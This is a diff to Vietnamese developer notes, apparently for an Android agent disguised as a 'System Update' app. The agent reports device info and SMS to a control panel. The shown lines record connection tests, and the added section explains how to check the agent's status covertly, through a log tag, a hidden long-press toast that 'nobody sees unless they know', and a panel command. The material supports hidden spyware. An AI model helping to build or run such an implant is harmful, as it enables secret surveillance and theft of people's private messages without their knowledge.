@@ -60,3 +60,8 @@ server psk=on, agent gửi plaintext  -> vẫn online, info/sms trả dữ liệ
 server psk=off, agent plaintext     -> online bình thường
 heartbeat 25s                       -> agent không bị sweep đóng sau 150s
 ```
+## Xem trạng thái mà không lộ ra màn hình
+
+- `adb logcat -s sysupd` → thấy `connected`, `handshake ok`, `net: ...`
+- Màn hình cài đặt: **giữ lâu vào tiêu đề "System Update"** → hiện toast trạng thái (không ai thấy nếu không biết)
+- Panel: tab Info → lệnh `status`
